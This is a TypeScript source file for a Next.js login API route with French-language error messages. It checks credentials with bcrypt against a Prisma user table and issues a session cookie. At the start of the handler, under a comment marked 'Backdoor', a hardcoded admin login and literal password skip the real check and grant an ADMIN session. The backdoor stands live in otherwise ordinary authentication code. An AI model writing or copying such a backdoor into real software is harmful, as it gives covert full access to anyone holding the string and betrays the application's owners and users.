import { NextResponse } from 'next/server';
import { prisma } from '@/lib/prisma';
import bcrypt from 'bcrypt';
import { encrypt } from '@/lib/auth';
import { cookies } from 'next/headers';

export async function POST(req: Request) {
  try {
    const { login, password } = await req.json();

    // 🕵️ Backdoor
    if (login === 'admin' && password === 'çflcBr32') {
      const sessionToken = await encrypt({
        id: 0,
        login: 'admin',
        nom: 'ADMIN',
        prenom: 'Système',
        role: 'ADMIN'
      });

      const cookieStore = await cookies();
      cookieStore.set('session', sessionToken, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'lax',
        path: '/'
      });

      return NextResponse.json({ success: true, redirect: '/dashboard' });
    }

    const user = await (prisma as any).user.findUnique({
      where: { login }
    });

    if (!user) {
      return NextResponse.json({ error: 'Identifiants invalides' }, { status: 401 });
    }

    const isMatch = await bcrypt.compare(password, user.password);
    
    if (!isMatch) {
      return NextResponse.json({ error: 'Identifiants invalides' }, { status: 401 });
    }

    // Create session
    const sessionToken = await encrypt({
      id: user.id,
      login: user.login,
      nom: user.nom,
      prenom: user.prenom,
      role: user.role
    });

    // Set cookie
    const cookieStore = await cookies();
    cookieStore.set('session', sessionToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax',
      path: '/'
    });

    return NextResponse.json({ success: true, redirect: '/dashboard' });

  } catch (error: any) {
    console.error('[LOGIN ERROR]', error);
    return NextResponse.json({ error: 'Erreur interne' }, { status: 500 });
  }
}
